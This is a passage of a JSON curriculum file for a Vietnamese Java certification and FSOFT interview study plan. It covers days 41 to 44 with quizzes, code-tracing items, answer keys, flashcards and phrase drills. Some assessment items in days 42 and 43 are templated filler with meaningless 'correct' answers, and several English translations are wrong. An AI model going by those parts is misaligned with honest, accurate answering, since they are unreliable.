              "ans": "In ra: `false`. `-4` là số chẵn (`isEven` trả về true), nhưng `-4 > 0` là sai (`isPositive` trả về false). Phép kết hợp `.and()` đòi hỏi cả 2 điều kiện phải đúng."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy biến effectively final trong Lambda",
          "questions": [
            {
              "q": "Đoạn code sau có biên dịch được không?\n```java\nint count = 0;\nRunnable r = () -> System.out.println(count);\ncount++;\n```",
              "ans": "Compile Error: `local variables referenced from a lambda expression must be final or effectively final`. Khi `count++` được gọi, biến `count` không còn là effectively final nữa nên không thể sử dụng bên trong lambda."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Default method conflict (Diamond Problem trong Interface)",
          "questions": [
            {
              "q": "Khi một class implements cả hai interface A và B đều có default method `default void hello()`, class đó bắt buộc phải làm gì để giải quyết xung đột?",
              "ans": "Class đó BẮT BUỘC phải override phương thức `hello()`, có thể tự viết lại thân hàm hoặc gọi tường minh phương thức của một trong hai interface theo cú pháp `A.super.hello();`."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_41_1",
          "q": "Thao tác nào sau đây trên Stream API là Terminal Operation (kết thúc Stream)?",
          "options": [
            "collect()",
            "filter()",
            "map()",
            "distinct()"
          ],
          "correct": 0,
          "exp": "collect(), forEach(), count(), reduce() là Terminal Operations đóng dòng Stream và xuất kết quả. filter, map, distinct là Intermediate Operations trả về Stream mới."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Khái niệm Functional Interface và biểu thức Lambda trong Java 8?",
          "a": "Functional Interface là interface chỉ có DUY NHẤT một phương thức trừu tượng (Single Abstract Method - SAM), có thể đánh dấu bằng `@FunctionalInterface`. Lambda expression cung cấp cú pháp ngắn gọn `(params) -> body` để implement trực tiếp interface này.",
          "trap": "Default method và static method không tính vào số lượng abstract method của Functional Interface."
        }
      ],
      "dailyEnglish": [
        {
          "id": 42,
          "vi": "Thực hiện lấy dữ liệu combobox theo các giá trị được lấy phía trước",
          "en": "Get data of combobox by values taken before"
        },
        {
          "id": 43,
          "vi": "- Hàm kiểm tra 1 đối tượng có tồn tại ít nhát 1 thuộc tính rỗng",
          "en": "Function of checking 1 object which exists at least 1 property"
        },
        {
          "id": 44,
          "vi": "Xử lý sự kiện khi người dùng click vào button XXX",
          "en": "Process event when user clicks button XXX"
        },
        {
          "id": 45,
          "vi": "- Chuyển đổi biến A có kiểu dữ liệu  BBB  sang biến C có kiểu dữ liệu DDD",
          "en": "Convert variable A with BBB data type to variable C with DDD data type"
        },
        {
          "id": 46,
          "vi": "Lấy ra đối tượng với tham số truyền vào",
          "en": "Get objects with inputted parameter"
        }
      ],
      "chapter": "Bổ sung Java 8-17 Features (OCA/OCP Alignment)"
    },
    "42": {
      "day": 42,
      "week": 6,
      "title": "Audit 1-1 Simulation Session #1",
      "topics": [
        "Mô phỏng phỏng vấn vấn đáp 1-1 với 10 câu hỏi cốt lõi"
      ],
      "tasks": [
        "Sử dụng tính năng Ghi âm trong Audit Simulator để tự nói thành tiếng (60-90 giây/câu)",
        "Nghe lại ghi âm và rà soát thuật ngữ tiếng Anh/tiếng Việt"
      ],
      "englishDrill": [
        {
          "id": 45,
          "vi": "- Chuyển đổi biến A có kiểu dữ liệu  BBB  sang biến C có kiểu dữ liệu DDD",
          "en": "Convert variable A with BBB data type to variable C with DDD data type"
        },
        {
          "id": 46,
          "vi": "Lấy ra đối tượng với tham số truyền vào",
          "en": "Get objects with inputted parameter"
        },
        {
          "id": 47,
          "vi": "Tạo mới 1 mảng bằng cách cắt chuỗi với tham số truyền vào (split())",
          "en": "Create 1 class by cutting string with inputted parameter"
        },
        {
          "id": 48,
          "vi": "-Export danh sách student theo kết quả search được khi người dùng button xxx",
          "en": "Export student list by result of searching when user clicks button xxx"
        },
        {
          "id": 49,
          "vi": "-Hàm delete 1 đối tượng đang hiển thị trên màn hình  khi người dùng button xxx",
          "en": "Function of deleting1 object which show on screen when  user click button xxx"
        }
      ],
      "summary": "AUDIT 1-1 SIMULATION SESSION #1: Mô phỏng phỏng vấn vấn đáp 10 câu hỏi then chốt.",
      "coreTheory": "\n### Chiến thuật trả lời phỏng vấn Audit 1-1 (60-90 giây/câu):\n1. **Khái niệm (Definition):** Trả lời trực diện vào câu hỏi bằng 1 câu định nghĩa ngắn gọn, chính xác.\n2. **So sánh / Cơ chế (How it works):** Nêu rõ bản chất bên dưới bộ nhớ (Stack, Heap, Hash Table, Container).\n3. **Ví dụ Code (Code Example):** Nói rõ một ví dụ cụ thể minh họa.\n4. **Cạm bẫy / Lưu ý (Trap / Gotcha):** Nhắc tới các trường hợp lỗi thường gặp (NullPointer, ClassCast, Thread-safety) để gây ấn tượng mạnh với Mentor!\n",
      "codeSnippet": "// Mở Tab \"Audit 1-1 Simulator\" trên Web App, bật Micro và tự ghi âm câu trả lời!",
      "traps": [
        "Nói lan man, không đúng trọng tâm, quên dùng thuật ngữ tiếng Anh chuẩn."
      ],
      "quickQuiz": [
        {
          "q": "Trong Java 8 Stream, phương thức `Stream.map()` khác `Stream.flatMap()` như thế nào?",
          "a": "`map()` biến đổi từng phần tử 1-1 thành một giá trị mới (`Function<T, R>`); `flatMap()` làm phẳng (flattening) các Stream lồng nhau (`Function<T, Stream<R>>`) thành một Stream đơn duy nhất."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Mô phỏng phỏng vấn vấn đáp 1-1 với 10 câu hỏi cốt lõi.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Chiến thuật trả lời phỏng vấn Audit 1-1 (60-90 giây/câu):\n1. **Khái niệm (Definition):** Trả lời trực diện vào câu hỏi bằng 1 câu định nghĩa ngắn gọn, chính xác.\n2. **So sánh / Cơ chế (How it works):** Nêu rõ bản chất bên dưới bộ nhớ (Stack, Heap, Hash Table, Container).\n3. **Ví dụ Code (Code Example):** Nói rõ một ví dụ cụ thể minh họa.\n4. **Cạm bẫy / Lưu ý (Trap / Gotcha):** Nhắc tới các trường hợp lỗi thường gặp (NullPointer, ClassCast, Thread-safety) để gây ấn tượng mạnh với Mentor!\n",
          "code": "// Mở Tab \"Audit 1-1 Simulator\" trên Web App, bật Micro và tự ghi âm câu trả lời!"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_42_1",
          "level": "Easy",
          "question": "Đã bấm ghi âm và nghe lại giọng nói của mình chưa?",
          "code": "// Mở Tab \"Audit 1-1 Simulator\" trên Web App, bật Micro và tự ghi âm câu trả lời!",
          "options": [
            "Đúng theo dự đoán",
            "Compile Error",
            "Runtime Exception",
            "Khác"
          ],
          "correctIndex": 0,
          "explanation": "Bắt buộc phải nghe lại để sửa ngắc ngứ!"
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Nói lan man, không đúng trọng tâm, quên dùng thuật ngữ tiếng Anh chuẩn.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Mở Tab \"Audit 1-1 Simulator\" trên Web App, bật Micro và tự ghi âm câu trả lời!",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Stream API: Intermediate vs Terminal",
          "questions": [
            {
              "q": "Trong Stream API, thao tác Intermediate khác thao tác Terminal ở điểm căn bản nào?",
              "ans": "Intermediate operation (như `filter()`, `map()`, `sorted()`): Trả về một Stream mới và hoạt động theo cơ chế Lazy evaluation (chưa thực thi tính toán ngay). Terminal operation (như `collect()`, `forEach()`, `count()`): Kích hoạt toàn bộ luồng xử lý tính toán và đóng Stream lại."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Optional class chống NPE",
          "questions": [
            {
              "q": "Tại sao không nên truyền `Optional` làm tham số đầu vào của phương thức hoặc dùng làm trường của Entity?",
              "ans": "Vì `Optional` được thiết kế thuần túy làm kiểu trả về của phương thức để biểu thị khả năng không có giá trị mà không gây NPE. `Optional` không implements `Serializable`, sẽ gây lỗi nếu dùng trong Entity hoặc lưu Session."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace Stream pipeline",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nList<String> list = Arrays.asList(\"ant\", \"bear\", \"cat\", \"dog\");\nlong count = list.stream()\n                 .filter(s -> s.length() == 3)\n                 .map(String::toUpperCase)\n                 .count();\nSystem.out.println(count);\n```\nKết quả in ra là gì?",
              "ans": "In ra: 3. Các từ có độ dài bằng 3 là \"ant\", \"cat\", \"dog\" (tổng cộng 3 phần tử thỏa điều kiện filter)."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy tái sử dụng Stream đã đóng",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nStream<String> stream = Stream.of(\"A\", \"B\");\nstream.forEach(System.out::print);\nstream.forEach(System.out::print);\n```\nChương trình xảy ra lỗi gì ở dòng thứ 3?",
              "ans": "Ném ngoại lệ `java.lang.IllegalStateException: stream has already been operated upon or closed`. Một Stream một khi đã thực thi Terminal operation (`forEach`) thì không thể tái sử dụng lần thứ hai."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "flatMap vs map trong Stream",
          "questions": [
            {
              "q": "Cho `List<List<Integer>> list = Arrays.asList(Arrays.asList(1, 2), Arrays.asList(3, 4));`. Viết đoạn code Stream để chuyển thành một danh sách phẳng `[1, 2, 3, 4]`.",
              "ans": "`List<Integer> flatList = list.stream().flatMap(Collection::stream).collect(Collectors.toList());`"
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_42_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Mô phỏng phỏng vấn vấn đáp 1-1 với 10 câu hỏi cốt lõi?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Mô phỏng phỏng vấn vấn đáp 1-1 với 10 câu hỏi cốt lõi phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Mô phỏng phỏng vấn vấn đáp 1-1 với 10 câu hỏi cốt lõi."
        },
        {
          "id": "da_42_2",
          "q": "Khi thao tác với Mô phỏng phỏng vấn vấn đáp 1-1 với 10 câu hỏi cốt lõi, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Cách trả lời câu hỏi phỏng vấn Audit: 'Tại sao String trong Java lại được thiết kế bất biến (Immutable)?'?",
          "a": "Trả lời theo 4 luận điểm Senior: 1. Cho phép cơ chế String Constant Pool tiết kiệm bộ nhớ.\n2. An toàn đa luồng (Thread-safe) tuyệt đối mà không cần đồng bộ.\n3. An toàn bảo mật (Security) khi dùng String làm tham số kết nối DB, mạng, classloader.\n4. Tối ưu hiệu năng khi dùng làm Key trong HashMap (hashCode được cache sẵn).",
          "trap": "Nêu đủ 4 lý do này sẽ đạt điểm tuyệt đối 10/10 ở vòng phỏng vấn 1-1."
        }
      ],
      "dailyEnglish": [
        {
          "id": 45,
          "vi": "- Chuyển đổi biến A có kiểu dữ liệu  BBB  sang biến C có kiểu dữ liệu DDD",
          "en": "Convert variable A with BBB data type to variable C with DDD data type"
        },
        {
          "id": 46,
          "vi": "Lấy ra đối tượng với tham số truyền vào",
          "en": "Get objects with inputted parameter"
        },
        {
          "id": 47,
          "vi": "Tạo mới 1 mảng bằng cách cắt chuỗi với tham số truyền vào (split())",
          "en": "Create 1 class by cutting string with inputted parameter"
        },
        {
          "id": 48,
          "vi": "-Export danh sách student theo kết quả search được khi người dùng button xxx",
          "en": "Export student list by result of searching when user clicks button xxx"
        },
        {
          "id": 49,
          "vi": "-Hàm delete 1 đối tượng đang hiển thị trên màn hình  khi người dùng button xxx",
          "en": "Function of deleting1 object which show on screen when  user click button xxx"
        }
      ]
    },
    "43": {
      "day": 43,
      "week": 7,
      "title": "TestKing Lần 2 - Đợt 1 (50 câu)",
      "topics": [
        "Tốc độ & phản xạ: mục tiêu < 60s/câu, không nhìn đáp án"
      ],
      "tasks": [
        "Làm 50 câu TestKing",
        "Đánh dấu các câu làm sai hoặc mất quá nhiều thời gian"
      ],
      "englishDrill": [
        {
          "id": 48,
          "vi": "-Export danh sách student theo kết quả search được khi người dùng button xxx",
          "en": "Export student list by result of searching when user clicks button xxx"
        },
        {
          "id": 49,
          "vi": "-Hàm delete 1 đối tượng đang hiển thị trên màn hình  khi người dùng button xxx",
          "en": "Function of deleting1 object which show on screen when  user click button xxx"
        },
        {
          "id": 50,
          "vi": "-Hàm thực hiện lọc theo yes/no khi người dùng checke/uncheck vào checkbox",
          "en": "Function of filtering by yes/no when user chooses check/uncheck into checkbox"
        },
        {
          "id": 51,
          "vi": "Chuyển đến trang ABC khi người dùng click button xxx",
          "en": "forward to ABC page when user clicks button xxx"
        },
        {
          "id": 52,
          "vi": "kiểm tra 1 dòng dữ liệu tồn tại trong cơ sở dữ liệu  thỏa mãn điều kiện trận đấu đó là trận đấu  gần nhất của 1 cặp thi đấu",
          "en": "Check 1 data row which exists in database, satisfying match conditions"
        }
      ],
      "summary": "TestKing Vòng 2 - Đợt 1: Tốc độ cao < 45s/câu, độ chính xác mục tiêu > 90%.",
      "coreTheory": "\n### Mục tiêu Tuần 7:\n- Luyện phản xạ: Đọc câu hỏi nhận diện ngay bẫy nằm ở dòng nào trong vòng 15 giây.\n- Không nhìn đáp án, tự suy luận ra kết quả rồi mới so sánh.\n- Các câu sai được gom lại để xử lý dứt điểm vào Ngày 47.\n",
      "codeSnippet": "// Luyện tốc độ cao 50 câu/ngày",
      "traps": [
        "Làm nhanh nhưng không ẩu, luôn kiểm tra xem code có compile được không trước khi tính output."
      ],
      "quickQuiz": [
        {
          "q": "Giá trị của biểu thức `10 + 20 + \"FSOFT\" + 30 + 40` trong Java là gì?",
          "a": "`\"30FSOFT3040\"`. Đánh giá từ trái qua phải: `10 + 20 = 30` (số), `30 + \"FSOFT\" = \"30FSOFT\"` (chuỗi), sau đó các phép `+` tiếp theo đều là nối chuỗi."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Tốc độ & phản xạ: mục tiêu < 60s/câu, không nhìn đáp án.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Mục tiêu Tuần 7:\n- Luyện phản xạ: Đọc câu hỏi nhận diện ngay bẫy nằm ở dòng nào trong vòng 15 giây.\n- Không nhìn đáp án, tự suy luận ra kết quả rồi mới so sánh.\n- Các câu sai được gom lại để xử lý dứt điểm vào Ngày 47.\n",
          "code": "// Luyện tốc độ cao 50 câu/ngày"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d43_1",
          "level": "Hard",
          "question": "Dự đoán kết quả của đoạn code kiểm tra bẫy toán tử và phép chia số nguyên sau:",
          "code": "public class FastOpTrace {\n    public static void main(String[] args) {\n        int a = 5;\n        int b = 2;\n        double result = a / b;\n        System.out.println(result);\n    }\n}",
          "options": [
            "2.0",
            "2.5",
            "2",
            "Compile Error"
          ],
          "correctIndex": 0,
          "explanation": "`a` và `b` đều là kiểu `int`. Phép chia `a / b` là phép chia số nguyên (Integer Division): `5 / 2 = 2` (phần thập phân bị cắt bỏ). Sau đó giá trị `2` mới được gán cho biến `double result`, được ép kiểu mở rộng thành `2.0`! Muốn ra 2.5 phải viết `(double)a / b`."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Làm nhanh nhưng không ẩu, luôn kiểm tra xem code có compile được không trước khi tính output.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Luyện tốc độ cao 50 câu/ngày",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Phản xạ tốc độ cao: Primitive & Modifiers",
          "questions": [
            {
              "q": "Phạm vi giá trị của kiểu `short` trong Java là bao nhiêu?",
              "ans": "Từ `-32,768` đến `32,767` (16-bit signed integer)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Toán tử dịch bit có dấu >> vs không dấu >>>",
          "questions": [
            {
              "q": "Phép dịch bit `>>` khác `>>>` như thế nào khi áp dụng cho số âm?",
              "ans": "`>>` (dịch có dấu) bảo toàn bit dấu bằng cách chèn bit 1 vào bên trái. `>>>` (dịch không dấu) luôn luôn chèn bit 0 vào bên trái bất kể số ban đầu âm hay dương."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace biểu thức logic phức hợp",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nint x = 1, y = 1;\nif (x++ > 1 && ++y > 1) {\n    x++;\n}\nSystem.out.println(x + \" \" + y);\n```\nKết quả in ra là gì?",
              "ans": "In ra: `2 1`. `x++ > 1` (1 > 1) là sai, sau đó `x` tăng lên 2. Do vế trái là false, toán tử `&&` dừng lại và KHÔNG thực thi `++y > 1`. Do đó `y` vẫn giữ nguyên giá trị 1."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy từ khóa strictfp",
          "questions": [
            {
              "q": "Từ khóa `strictfp` trong Java có tác dụng gì?",
              "ans": "Đảm bảo các phép tính toán số thực dấu phẩy động (`float`, `double`) cho ra kết quả hoàn toàn giống nhau trên mọi nền tảng phần cứng và kiến trúc CPU theo chuẩn IEEE 754."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Tối ưu hóa bitwise flags",
          "questions": [
            {
              "q": "Làm thế nào để kiểm tra xem một số nguyên `n` có phải là lũy thừa của 2 (`2^k`) hay không bằng toán tử bitwise trong `O(1)`?",
              "ans": "Biểu thức: `(n > 0) && ((n & (n - 1)) == 0)`."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_43_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Tốc độ & phản xạ: mục tiêu < 60s/câu, không nhìn đáp án?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Tốc độ & phản xạ: mục tiêu < 60s/câu, không nhìn đáp án phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Tốc độ & phản xạ: mục tiêu < 60s/câu, không nhìn đáp án."
        },
        {
          "id": "da_43_2",
          "q": "Khi thao tác với Tốc độ & phản xạ: mục tiêu < 60s/câu, không nhìn đáp án, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Chiến thuật làm bài trắc nghiệm TestKing tốc độ cao (< 45s/câu)?",
          "a": "1. Đọc ngay câu hỏi ở dòng cuối cùng trước để biết đề hỏi gì (in ra kết quả gì hay có Compile Error).\n2. Quét nhanh các bẫy cú pháp (Octal 08, ép kiểu byte, switch float, uninitialized local).\n3. Nếu thấy code hợp lệ, mới bắt đầu trace luồng thực thi.",
          "trap": "Không đọc code từ trên xuống dưới một cách mù quáng, rất mất thời gian."
        }
      ],
      "dailyEnglish": [
        {
          "id": 48,
          "vi": "-Export danh sách student theo kết quả search được khi người dùng button xxx",
          "en": "Export student list by result of searching when user clicks button xxx"
        },
        {
          "id": 49,
          "vi": "-Hàm delete 1 đối tượng đang hiển thị trên màn hình  khi người dùng button xxx",
          "en": "Function of deleting1 object which show on screen when  user click button xxx"
        },
        {
          "id": 50,
          "vi": "-Hàm thực hiện lọc theo yes/no khi người dùng checke/uncheck vào checkbox",
          "en": "Function of filtering by yes/no when user chooses check/uncheck into checkbox"
        },
        {
          "id": 51,
          "vi": "Chuyển đến trang ABC khi người dùng click button xxx",
          "en": "forward to ABC page when user clicks button xxx"
        },
        {
          "id": 52,
          "vi": "kiểm tra 1 dòng dữ liệu tồn tại trong cơ sở dữ liệu  thỏa mãn điều kiện trận đấu đó là trận đấu  gần nhất của 1 cặp thi đấu",
          "en": "Check 1 data row which exists in database, satisfying match conditions"
        }
      ]
    },
    "44": {
      "day": 44,
      "week": 7,
      "title": "TestKing Lần 2 - Đợt 2 (50 câu)",
      "topics": [
        "Tập trung vào câu hỏi Exception & Flow control"
      ],
      "tasks": [
        "Làm 50 câu TestKing",
        "Soát lại bảng Exception Hierarchy"
      ],
      "englishDrill": [
        {
          "id": 51,
          "vi": "Chuyển đến trang ABC khi người dùng click button xxx",
          "en": "forward to ABC page when user clicks button xxx"
        },
        {
          "id": 52,
          "vi": "kiểm tra 1 dòng dữ liệu tồn tại trong cơ sở dữ liệu  thỏa mãn điều kiện trận đấu đó là trận đấu  gần nhất của 1 cặp thi đấu",
          "en": "Check 1 data row which exists in database, satisfying match conditions"
        },
        {
          "id": 53,
          "vi": "Tìm những cặp đấu đã từng thi đấu  với nhau ít nhất 2 lần",
          "en": "Search matches which have at least 2 times of competitions"
        },
        {
          "id": 54,
          "vi": "So sánh ngày thi đấu gần nhất với ngày  chuẩn bị chèn vào cơ sở dữ liệu",
          "en": "Compare the nearest match date with the inserted date in database"
        },
        {
          "id": 55,
          "vi": "mã trận đấu nên theo định dạng sau  ( không bắt buộc)",
          "en": "Match code should be in following format (un-required)"
        }
      ],
      "summary": "TestKing Vòng 2 - Đợt 2: Tốc độ cao < 45s/câu, độ chính xác mục tiêu > 90%.",
      "coreTheory": "\n### Mục tiêu Tuần 7:\n- Luyện phản xạ: Đọc câu hỏi nhận diện ngay bẫy nằm ở dòng nào trong vòng 15 giây.\n- Không nhìn đáp án, tự suy luận ra kết quả rồi mới so sánh.\n- Các câu sai được gom lại để xử lý dứt điểm vào Ngày 47.\n",
      "codeSnippet": "// Luyện tốc độ cao 50 câu/ngày",
      "traps": [
        "Làm nhanh nhưng không ẩu, luôn kiểm tra xem code có compile được không trước khi tính output."
      ],
      "quickQuiz": [
        {
          "q": "Trong Java, một phương thức override có được phép khai báo ném ra Checked Exception rộng hơn phương thức ở class cha không?",
          "a": "Không! Phương thức con chỉ được ném cùng loại Checked Exception, Exception con, hoặc không ném ngoại lệ nào. Ném rộng hơn sẽ bị Compile Error."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Tập trung vào câu hỏi Exception & Flow control.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Mục tiêu Tuần 7:\n- Luyện phản xạ: Đọc câu hỏi nhận diện ngay bẫy nằm ở dòng nào trong vòng 15 giây.\n- Không nhìn đáp án, tự suy luận ra kết quả rồi mới so sánh.\n- Các câu sai được gom lại để xử lý dứt điểm vào Ngày 47.\n",
          "code": "// Luyện tốc độ cao 50 câu/ngày"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d44_1",
          "level": "Hard",
          "question": "Đoạn code bẫy switch sau in ra kết quả gì?",
          "code": "public class SwitchFallthrough {\n    public static void main(String[] args) {\n        int k = 2;\n        switch (k) {\n            case 1: System.out.print(\"1 \");\n            case 2: System.out.print(\"2 \");\n            case 3: System.out.print(\"3 \");\n            default: System.out.print(\"D \");\n        }\n    }\n}",
          "options": [
            "2 3 D ",
            "2 ",
            "2 3 ",
            "Compile Error"
          ],
          "correctIndex": 0,
          "explanation": "Biến `k = 2` khớp với `case 2:`, in ra `2 `. Do không có lệnh `break`, chương trình rơi tự do (fall-through) thực thi tiếp `case 3:` in `3 `, rồi tiếp tục rơi xuống `default:` in `D `. Kết quả in ra là: `2 3 D `."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Làm nhanh nhưng không ẩu, luôn kiểm tra xem code có compile được không trước khi tính output.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Luyện tốc độ cao 50 câu/ngày",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Phản xạ tốc độ cao: Đa hình và Kế thừa",
          "questions": [
            {
              "q": "Một class con có thể giảm phạm vi của ngoại lệ Checked Exception khi override không?",
              "ans": "Có! Class con có thể ném loại ngoại lệ hẹp hơn (subclass) hoặc không ném ngoại lệ nào cả."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Dynamic Binding và con trỏ vtable",
          "questions": [
            {
              "q": "Cơ chế nào bên trong máy ảo JVM giúp xác định đúng phương thức cần thực thi khi gọi đa hình `parentRef.method()`?",
              "ans": "JVM sử dụng bảng con trỏ phương thức ảo (Virtual Method Table - `vtable`). Khi gọi phương thức, JVM tra cứu địa chỉ hàm trong vtable của đối tượng thực tế trên Heap tại thời điểm runtime."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace gọi phương thức bị override từ constructor cha",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nclass Base {\n    Base() { print(); }\n    void print() { System.out.print(\"Base \"); }\n}\nclass Derived extends Base {\n    int num = 100;\n    void print() { System.out.print(num + \" \"); }\n}\npublic class Test {\n    public static void main(String[] args) {\n        new Derived();\n    }\n}\n```\nKết quả in ra là gì? Tại sao?",
              "ans": "In ra: `0 `. Khi `new Derived()` chạy, constructor `Base()` được gọi trước. `Base()` gọi phương thức `print()`, do cơ chế đa hình runtime nó kích hoạt `Derived.print()`. Tuy nhiên tại thời điểm này trường `num` của Derived chưa được khởi tạo nên mang giá trị mặc định là 0!"
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy instanceof với null",
          "questions": [
            {
              "q": "Cho khai báo `String str = null; boolean b = str instanceof String;`. Giá trị của `b` là gì?",
              "ans": "`b = false`. Toán tử `instanceof` luôn trả về `false` nếu toán hạng bên trái là `null`."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
